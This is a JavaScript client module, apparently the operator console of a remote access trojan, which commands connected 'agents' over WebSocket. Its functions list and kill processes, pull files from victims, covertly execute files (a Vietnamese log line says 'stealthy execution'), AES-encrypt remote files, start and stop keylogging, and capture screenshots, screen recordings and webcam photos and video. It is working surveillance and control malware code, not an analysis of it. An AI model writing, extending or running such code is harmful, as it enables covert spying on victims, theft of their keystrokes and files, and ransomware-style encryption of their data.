import { CONFIG } from './config.js';

export class Gateway{
    /**
     * @param {Object} callbacks
     * @param {Function} callbacks.onConnected
     * @param {Function} callbacks.onDisconnected
     * @param {Function} callbacks.onMessage
     * @param {Function} callbacks.onError 
     * @param {Function} callbacks.onAuthSuccess 
     * @param {Function} callbacks.onAgentListUpdate
     * @param {Function} callbacks.onScreenshot     
     * @param {Function} callbacks.onCamera        
     * @param {Function} callbacks.onKeylog         
     * @param {Function} callbacks.onMessage
     * @param {Function} callbacks.onSystemInfo
     */

    constructor(callbacks = {}) {
        this.ws = null;
        this.callbacks = callbacks;
        this.isAuthenticated = false;
        this.machineId = this._getMachineId();
        this.targetId = 'ALL';
        this._hasTriedInsecure = false;
        this._lastCloseCode = null;

        this.ui = window.ui || { log: console.log, renderList: console.table };

        this.agentsList = [];
        this.appListCache = [];
        this.processListCache = [];
        this.transferSessions = {};
        this.onSystemInfo = {};
    }

    findAgentId(input) {
        if (input === 'ALL') return 'ALL';
        
        const agent = this.agentsList.find(a => 
            a.id === input || 
            a.ip === input || 
            a.machineId === input
        );

        return agent ? agent.id : null;
    }

    _getMachineId() {
        let id = localStorage.getItem(CONFIG.LOCAL_STORAGE_ID_KEY);
        if (!id) {
            const hostname = window.location.hostname || 'localhost';
            const userAgent = navigator.userAgent || 'unknown';
            const platform = navigator.platform || 'unknown';
            
            const hash = this._simpleHash(hostname + userAgent + platform);
            const shortHash = hash.toString(36).substring(0, 8).toUpperCase();
            
            id = `CLI-${hostname}-${shortHash}`;
            id = id.replace(/[^a-zA-Z0-9\-_]/g, '-').substring(0, 50);
            localStorage.setItem(CONFIG.LOCAL_STORAGE_ID_KEY, id);
        }
        return id;
    }

    _simpleHash(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash);
    }

    connect(ip, port = CONFIG.SERVER_PORT, useSecure = true) {
        if (this.ws) {
            console.log(`[Gateway] Closing existing connection before creating new one`);
            this.ws.close();
            this.ws = null;
        }
        
        if (port === CONFIG.SERVER_PORT + 2) {
            useSecure = false;
        }
        
        if (useSecure) {
            this._hasTriedInsecure = false;
        }

        const protocol = useSecure ? 'wss' : 'ws';
        const url = `${protocol}://${ip}:${port}`;
        console.log(`[Gateway] Creating new connection to ${url}...`);

        this.ws = new WebSocket(url);

        this.ws.binaryType = "arraybuffer";

        this.ws.onopen = () => {
            console.log(`[Network] Socket opened successfully to ${url}`)
            console.log(`[Network] Waiting for user to enter password...`)

            if (this.callbacks.onConnected) {
                this.callbacks.onConnected();
            }
        };

        this.ws.onmessage = (event) => {
            if (event.data instanceof ArrayBuffer) {
            } else {
               this._handleInternalMessage(event);
            }
        };
        
        this.ws.onclose = (event) => {
            const wasAuthenticated = this.isAuthenticated;
            const connectionId = this.clientConnectionId || 'none';
            this._lastCloseCode = event.code;
            this.isAuthenticated = false;
            
            console.log(`[Network] Socket closed. Code: ${event.code}, Reason: ${event.reason || 'Unknown'}`);
            
            if (wasAuthenticated && this.callbacks.onDisconnected) {
                this.callbacks.onDisconnected();
            } else if (!wasAuthenticated) {
                console.log(`[Network] Connection closed before authentication - not triggering disconnect callback`);
            }
        };

        this.ws.onerror = (err) => {
            if (this.callbacks.onError) {
                this.callbacks.onError(err);
            }
        };
    }

    disconnect() {
        if (this.ws) {
            this.ws.close();
        }
    }

    authenticate() {
        if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
            console.warn(`[Gateway] Cannot authenticate: Socket not open.`);
            return;
            if (this.callbacks.onError) {
                this.callbacks.onError(new Error(`[Gateway] Cannot authenticate: Socket not open.`));
            }
            return;
        }

        console.log(`[Gateway] Authenticating with password...`);
        this.send(CONFIG.CMD.AUTH, {
            pass: password,
            role: 'CLIENT',
            machineId: this.machineId
        });
    }

    authenticateWithPassword(password) {
        if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
            console.error("[Gateway] Cannot authenticate: WebSocket not open");
            if (this.callbacks.onError) {
                this.callbacks.onError(new Error("WebSocket not connected"));
            }
            return;
        }
        
        if (!password || !password.trim()) {
            console.error("[Gateway] Cannot authenticate: Password is required");
            if (this.callbacks.onError) {
                this.callbacks.onError(new Error("Password is required"));
            }
            return;
        }
        
        console.log(`[Gateway] Authenticating with password...`);
        this.send(CONFIG.CMD.AUTH, {
            pass: password.trim(),
            role: 'CLIENT',
            machineId: this.machineId
        });
    }

    send(type, data, specificTarget = null) {
        if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
            console.warn(`[Gateway] Cannot send: Socket not open.`);
            return;
        }

        if (type === CONFIG.CMD.AUTH) {
            const authMsg = JSON.stringify({type, data});
            console.log(`[Gateway] Sending AUTH message: ${authMsg.substring(0, 100)}...`);
            this.ws.send(authMsg);
            console.log(`[Gateway] AUTH message sent successfully`);
            return;
        }

        if (type === CONFIG.CMD.GET_AGENTS) {
            const payload = {
                type: type,
                data: data,
                from: this.clientConnectionId || this.machineId,
                to: 'ALL' 
            }
            this.ws.send(JSON.stringify(payload));
            return;
        }

        const target = specificTarget || this.targetId;
        
        if (target === 'ALL') {
            console.error(`[Gateway] Cannot send command ${type}: No agent selected. Please select an agent first.`);
            if (this.ui && this.ui.log) {
                this.ui.log('Error', `Vui lòng chọn một agent trước khi gửi lệnh ${type}`);
            }
            return;
        }

        const payload = {
            type: type,
            data: data,
            from: this.clientConnectionId || this.machineId,
            to: target
        }

        this.ws.send(JSON.stringify(payload));
    }

    setTarget(input) {
        const realId = this.findAgentId(input);
        
        if (realId) {
            this.targetId = realId;
            console.log(`[Gateway] Target locked: ${realId} (Matched: ${input})`);
        } else {
            console.warn(`[Gateway] Could not find agent with Name/IP/ID: ${input}`);
            console.log("Available Agents:", this.agentsList);
        }
    }

    refreshAgents() {
        this.send(CONFIG.CMD.GET_AGENTS, {});
    }

    fetchProcessList() {
        this.send(CONFIG.CMD.PROC_LIST, "");
    }

    startProcess(id) {
        this.send(CONFIG.CMD.PROC_START, String(id));
    }

    killProcess(id) {
        this.send(CONFIG.CMD.PROC_KILL, String(id));
    }

    fetchAppList() {
        console.log('[Gateway] fetchAppList() called, sending APP_LIST request to target:', this.targetId);
        this.send(CONFIG.CMD.APP_LIST, "");
    }

    startApp(id) {
        this.send(CONFIG.CMD.APP_START, String(id));
    }

    killApp(id) {
        this.send(CONFIG.CMD.APP_KILL, String(id));
    }

    listFiles(path = "") {
        const data = typeof path === 'string' ? path : JSON.stringify({ path });
        this.send(CONFIG.CMD.FILE_LIST, data);
    }

    executeFile(path) {
        window.ui.log('System', `Đang yêu cầu thực thi lén: ${path}`);
        this.send(CONFIG.CMD.FILE_EXECUTE, path);
    }

    encryptFile(path, key = "", iv = "") {
        window.ui.log('System', `Đang yêu cầu xử lý AES cho: ${path}`);
        this.send(CONFIG.CMD.FILE_ENCRYPT, {
            path: path,
            key: key,
            iv: iv
        });
    }

    _handleInternalMessage(event) {
        try {
            let msg;
            try { msg = JSON.parse(event.data); } 
            catch { msg = { type: 'raw', data: event.data }; }
            const senderId = msg.from;

            switch (msg.type) {
                case CONFIG.CMD.AUTH:
                    if (msg.data && msg.data.status === 'ok') {
                        this.isAuthenticated = true;
                        this.clientConnectionId = msg.data.sessionId || this.machineId;
                        console.log(`[Gateway] Authentication successful! Session: ${this.clientConnectionId}`);
                        this.ui.log('Auth', `Success! Connected as: ${this.clientConnectionId}`, 'info');
                        if (this.callbacks.onAuthSuccess) this.callbacks.onAuthSuccess();
                        //this.refreshAgents();
                    } else {
                        console.error(`[Gateway] Auth Failed:`, msg.data);
                        this.isAuthenticated = false;

                        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
                            this.ws.close(1008, 'Authentication failed');
                        }

                        if (this.callbacks.onError) {
                            this.callbacks.onError(new Error(msg.data.msg || 'Authentication failed'));
                        }
                    }
                    break;
                case CONFIG.CMD.GET_AGENTS:
                    this.agentsList = msg.data; 
                    console.table(this.agentsList);

                    if (this.callbacks.onAgentListUpdate) {
                        this.callbacks.onAgentListUpdate(msg.data);
                    } 
                    break;
                case CONFIG.CMD.PROC_LIST:
                    console.log('[Gateway] PROC_LIST received:', {
                        type: typeof msg.data,
                        isArray: Array.isArray(msg.data),
                        isObject: typeof msg.data === 'object' && msg.data !== null,
                        data: msg.data,
                        length: Array.isArray(msg.data) ? msg.data.length : (msg.data ? Object.keys(msg.data).length : 0)
                    });
                    
                    if (Array.isArray(msg.data)) {
                        this.processListCache = msg.data;
                    } else if (msg.data && typeof msg.data === 'object') {
                        if (msg.data.processes && Array.isArray(msg.data.processes)) {
                            this.processListCache = msg.data.processes;
                        } else if (msg.data.data && Array.isArray(msg.data.data)) {
                            this.processListCache = msg.data.data;
                        } else {
                            const keys = Object.keys(msg.data);
                            if (keys.length > 0 && !isNaN(keys[0])) {
                                this.processListCache = Object.values(msg.data);
                            } else {
                                this.processListCache = [];
                            }
                        }
                    } else if (typeof msg.data === 'string' && msg.data.trim()) {
                        console.log('[Gateway] Parsing PROC_LIST string format...');
                        const lines = msg.data.split('\n').filter(line => line.trim());
                        this.processListCache = lines.map((line, index) => {
                            let match = line.match(/PID:\s*(\d+)\s*\|\s*Name:\s*(.+)$/);
                            if (match) {
                                const pid = parseInt(match[1], 10);
                                const name = match[2].trim();
                                return {
                                    id: index,
                                    name: name,
                                    pid: pid,
                                    index: index
                                };
                            }
                            
                            match = line.match(/^(\d+)\.\s*PID:\s*(\d+)\s*\|\s*Name:\s*(.+)$/);
                            if (match) {
                                const id = parseInt(match[1], 10);
                                const pid = parseInt(match[2], 10);
                                const name = match[3].trim();
                                return {
                                    id: id,
                                    name: name,
                                    pid: pid,
                                    index: id
                                };
                            }
                            
                            match = line.match(/^(\d+)\.\s*Name:\s*(.+)$/);
                            if (match) {
                                const id = parseInt(match[1], 10);
                                const name = match[2].trim();
                                return {
                                    id: id,
                                    name: name,
                                    pid: null,
                                    index: id
                                };
                            }
                            
                            return {
                                id: index,
                                name: line.trim(),
                                pid: null,
                                index: index
                            };
                        });
                        console.log('[Gateway] Parsed', this.processListCache.length, 'processes from string');
                    } else {
                        this.processListCache = [];
                    }
                    
                    console.log('[Gateway] processListCache after processing:', {
                        length: this.processListCache.length,
                        sample: this.processListCache[0] || 'N/A'
                    });
                    this.ui.renderList('Process List', this.processListCache);
                    break;
                case CONFIG.CMD.APP_LIST:
                    console.log('[Gateway] APP_LIST received:', {
                        type: typeof msg.data,
                        isArray: Array.isArray(msg.data),
                        isObject: typeof msg.data === 'object' && msg.data !== null,
                        data: msg.data,
                        length: Array.isArray(msg.data) ? msg.data.length : (msg.data ? Object.keys(msg.data).length : 0)
                    });
                    
                    if (Array.isArray(msg.data)) {
                        this.appListCache = msg.data;
                    } else if (msg.data && typeof msg.data === 'object') {
                        if (msg.data.apps && Array.isArray(msg.data.apps)) {
                            this.appListCache = msg.data.apps;
                        } else if (msg.data.data && Array.isArray(msg.data.data)) {
                            this.appListCache = msg.data.data;
                        } else {
                            const keys = Object.keys(msg.data);
                            if (keys.length > 0 && !isNaN(keys[0])) {
                                this.appListCache = Object.values(msg.data);
                            } else {
                                this.appListCache = [];
                            }
                        }
                    } else if (typeof msg.data === 'string' && msg.data.trim()) {
                        console.log('[Gateway] Parsing APP_LIST string format...');
                        const lines = msg.data.split('\n').filter(line => line.trim());
                        this.appListCache = lines.map((line, index) => {
                            const match = line.match(/^(\d+)\.\s*Name:\s*(.+)$/);
                            if (match) {
                                const id = parseInt(match[1], 10);
                                const name = match[2].trim();
                                return {
                                    id: id,
                                    name: name,
                                    index: id
                                };
                            } else {
                                return {
                                    id: index,
                                    name: line.trim(),
                                    index: index
                                };
                            }
                        });
                        console.log('[Gateway] Parsed', this.appListCache.length, 'apps from string');
                    } else {
                        this.appListCache = [];
                    }
                    
                    console.log('[Gateway] appListCache after processing:', {
                        length: this.appListCache.length,
                        sample: this.appListCache[0] || 'N/A'
                    });
                    this.ui.renderList('Application List', this.appListCache);
                    break;
                case CONFIG.CMD.FILE_LIST:
                    console.log("[Gateway] Data arrived:", msg.data);
                    if (msg.data && msg.data.status === 'ok') {
                        if (window.ui && typeof window.ui.renderFileList === 'function') {
                            window.ui.renderFileList(msg.data.path, msg.data.files, msg.data.count);
                        }
                    } else {
                        if (window.ui && window.ui.log) window.ui.log('Error', msg.data?.msg || 'Lỗi lấy file');
                    }
                    break;
                case CONFIG.CMD.FILE_PROGRESS:
                    if (msg.data.status === 'start') {
                        this.transferSessions[msg.data.sessionId] = {
                            fileName: msg.data.fileName,
                            chunks: [],
                            totalSize: msg.data.totalSize
                        };
                        this.ui.log('System', `Bắt đầu nhận file: ${msg.data.fileName}...`);
                    }
                    break;

                case CONFIG.CMD.FILE_CHUNK:
                    const session = this.transferSessions[msg.data.sessionId];
                    if (session) {
                        session.chunks.push(msg.data.data); 
                    }
                    break;

                case CONFIG.CMD.FILE_COMPLETE:
                    const doneSession = this.transferSessions[msg.data.sessionId];
                    if (doneSession) {
                        this.ui.log('System', `Tải xong: ${doneSession.fileName}. Đang xử lý...`);
                        this._triggerBrowserDownload(doneSession);
                        delete this.transferSessions[msg.data.sessionId];
                    }
                    if (this.callbacks.onMessage) {
                        this.callbacks.onMessage(msg);
                    }
                    break;
                case CONFIG.CMD.FILE_EXECUTE:
                    this._handleCommandResult(msg.type, msg.data);
                    if (msg.data.status === 'ok') {
                        alert("System: " + (msg.data.msg || "Execution triggered successfully!"));
                        this.listFiles(window.fmState?.path || "");
                    } else {
                        alert("Error: " + (msg.data.msg || "Execution failed."));
                    }
                    break;

                case CONFIG.CMD.FILE_ENCRYPT:
                    this._handleCommandResult(msg.type, msg.data);
                    if (msg.data.status === 'ok') {
                        alert("System: " + (msg.data.msg || "AES process completed successfully!"));
                        this.listFiles(window.fmState?.path || "");
                    } else {
                        alert("Error: " + (msg.data.msg || "Encryption/Decryption failed."));
                    }
                    break;
                case CONFIG.CMD.SYSTEM_INFO:
                    if (msg.data && msg.data.status === 'ok') {
                        if (this.callbacks.onSystemInfo) {
                            this.callbacks.onSystemInfo(msg.data, senderId);
                        }
                    } else {
                        console.error("Agent error (System Info):", msg.data?.msg);
                    }
                    break;
                case CONFIG.CMD.PROC_START:
                case CONFIG.CMD.PROC_KILL:
                case CONFIG.CMD.APP_START:
                case CONFIG.CMD.APP_KILL:
                case CONFIG.CMD.START_KEYLOG:
                case CONFIG.CMD.STOP_KEYLOG:
                case CONFIG.CMD.FILE_ENCRYPT:
                    this._handleCommandResult(msg.type, msg.data);
                    break;
                case CONFIG.CMD.SCREENSHOT:
                    if (msg.data && msg.data.status === 'ok') {
                        if (senderId && this.targetId && this.targetId !== 'ALL') {
                            const targetAgent = this.agentsList.find(a => 
                                a.id === this.targetId || 
                                a.machineId === this.targetId || 
                                a.ip === this.targetId
                            );
                            const senderAgent = this.agentsList.find(a => 
                                a.id === senderId || 
                                a.machineId === senderId || 
                                a.ip === senderId
                            );
                            
                            if (!targetAgent || !senderAgent || targetAgent.id !== senderAgent.id) {
                                console.log(`[Gateway] Ignoring screenshot from ${senderId} (target is ${this.targetId})`);
                                return;
                            }
                        }
                        console.log(`[Gateway] Screenshot received from ${senderId}`);
                        if (this.callbacks.onScreenshot) {
                            this.callbacks.onScreenshot(msg.data.data, senderId);
                        }
                    } else {
                        const errorMsg = msg.data?.msg || 'Không thể chụp màn hình';
                        console.error(`[Gateway] Screenshot failed: ${errorMsg}`);
                        if (window.handleCaptureError) {
                            window.handleCaptureError(errorMsg);
                        }
                    }
                    break;
                case CONFIG.CMD.CAM_RECORD:
                    if (msg.data && msg.data.status === 'ok') {
                        if (senderId && this.targetId && this.targetId !== 'ALL') {
                            const targetAgent = this.agentsList.find(a => 
                                a.id === this.targetId || 
                                a.machineId === this.targetId || 
                                a.ip === this.targetId
                            );
                            const senderAgent = this.agentsList.find(a => 
                                a.id === senderId || 
                                a.machineId === senderId || 
                                a.ip === senderId
                            );
                            
                            if (!targetAgent || !senderAgent || targetAgent.id !== senderAgent.id) {
                                console.log(`[Gateway] Ignoring camera video from ${senderId} (target is ${this.targetId})`);
                                return;
                            }
                        }
                        console.log(`[Gateway] Camera video received from ${senderId}`);
                        if (this.callbacks.onCamera) {
                            this.callbacks.onCamera(msg.data.data, senderId);
                        }
                    } else {
                        const errorMsg = msg.data?.msg || 'Không thể ghi video webcam';
                        console.error(`[Gateway] Camera record failed: ${errorMsg}`);
                        if (window.handleCaptureError) {
                            window.handleCaptureError(errorMsg);
                        }
                    }
                    break;
                case CONFIG.CMD.CAMSHOT:
                    if (msg.data && msg.data.status === 'ok') {
                        if (senderId && this.targetId && this.targetId !== 'ALL') {
                            const targetAgent = this.agentsList.find(a => 
                                a.id === this.targetId || 
                                a.machineId === this.targetId || 
                                a.ip === this.targetId
                            );
                            const senderAgent = this.agentsList.find(a => 
                                a.id === senderId || 
                                a.machineId === senderId || 
                                a.ip === senderId
                            );
                            
                            if (!targetAgent || !senderAgent || targetAgent.id !== senderAgent.id) {
                                console.log(`[Gateway] Ignoring camera shot from ${senderId} (target is ${this.targetId})`);
                                return;
                            }
                        }
                        console.log(`[Gateway] Camera shot received from ${senderId}`);
                        if (this.callbacks.onScreenshot) {
                            this.callbacks.onScreenshot(msg.data.data, senderId);
                        }
                    } else {
                        const errorMsg = msg.data?.msg || 'Không thể chụp ảnh webcam';
                        console.error(`[Gateway] Camera shot failed: ${errorMsg}`);
                        if (window.handleCaptureError) {
                            window.handleCaptureError(errorMsg);
                        }
                    }
                    break;
                case CONFIG.CMD.SCR_RECORD:
                    if (msg.data && msg.data.status === 'ok') {
                        if (senderId && this.targetId && this.targetId !== 'ALL') {
                            const targetAgent = this.agentsList.find(a => 
                                a.id === this.targetId || 
                                a.machineId === this.targetId || 
                                a.ip === this.targetId
                            );
                            const senderAgent = this.agentsList.find(a => 
                                a.id === senderId || 
                                a.machineId === senderId || 
                                a.ip === senderId
                            );
                            
                            if (!targetAgent || !senderAgent || targetAgent.id !== senderAgent.id) {
                                console.log(`[Gateway] Ignoring screen recording from ${senderId} (target is ${this.targetId})`);
                                return;
                            }
                        }
                        console.log(`[Gateway] Screen recording received from ${senderId}`);
                        if (this.callbacks.onCamera) {
                            this.callbacks.onCamera(msg.data.data, senderId);
                        }
                    } else {
                        const errorMsg = msg.data?.msg || 'Không thể ghi màn hình';
                        console.error(`[Gateway] Screen record failed: ${errorMsg}`);
                        if (window.handleCaptureError) {
                            window.handleCaptureError(errorMsg);
                        }
                    }
                    break;
                case CONFIG.CMD.STREAM_DATA:
                    if (msg.data && msg.data.data) {
                        if (this.callbacks.onKeylog) {
                            this.callbacks.onKeylog(msg.data.data, senderId);
                        }
                    }
                    break;
                case CONFIG.CMD.ERROR:
                    console.error("[Gateway] Server Error:", msg.data);
                    const errorMsg = typeof msg.data === 'string' ? msg.data : (msg.data?.msg || JSON.stringify(msg.data));
                    this.ui.log('Error', errorMsg);
                    if (errorMsg.includes('Authentication') || errorMsg.includes('password') || errorMsg.includes('login')) {
                        console.error("[Gateway] Authentication failed - connection will be closed");
                        console.error("[Gateway] Check AUTH_HASH in config.js matches AUTH_SECRET in Gateway");
                    }
                    break;
                default:
                    this.ui.log('Server', JSON.stringify(msg.data));
                    if(this.callbacks.onMessage) {
                    this.callbacks.onMessage(msg);
            }
            }

        } catch (e) {
            console.error('[Gateway] Error handling message: ', e);
        }
    }

    _handleCommandResult(type, data) {
        const isSuccess = data.status === 'ok';
        const logMsg = `${type}: ${data.msg} (ID: ${data.id || 'N/A'})`;

        if (isSuccess) {
            console.log(`[Success] ${logMsg}`);
            this.ui.log('System', data.msg);

            if (type.includes("APP")) this.fetchAppList();
            if (type.includes("PROC")) this.fetchProcessList();
        } else {
            console.warn(`[Failed] ${logMsg}`);
            this.ui.log('Error', data.msg);
        }
    }

    getFormattedAppList() {
        if (!Array.isArray(this.appListCache)) {
            return [];
        }
        
        return this.appListCache.map((app, index) => {
            let appId = index;
            if (app.id !== undefined && app.id !== null) {
                const numId = typeof app.id === 'number' ? app.id : parseInt(app.id, 10);
                if (!isNaN(numId) && numId >= 0) {
                    appId = numId;
                }
            }
            
            return {
                id: appId, 
                name: app.name || app.path || 'Unknown',
                status: app.status || (app.running ? 'running' : 'paused'),
                path: app.path || '',
                pid: app.pid || null
            };
        });
    }

    getFormattedProcessList() {
        if (!Array.isArray(this.processListCache)) {
            return [];
        }
        
        return this.processListCache.map((proc, index) => {
            const procId = index; 
            
            return {
                id: procId, 
                name: proc.name || proc.processName || 'Unknown',
                status: proc.status || (proc.running ? 'running' : 'paused'),
                pid: proc.pid || null,
                cpu: proc.cpu || null,
                memory: proc.memory || null
            };
        });
    }

    _triggerBrowserDownload(session) {
        const byteCharacters = session.chunks.map(chunk => atob(chunk)).join('');
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: 'application/octet-stream' });
        
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = session.fileName;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        a.remove();
    }
}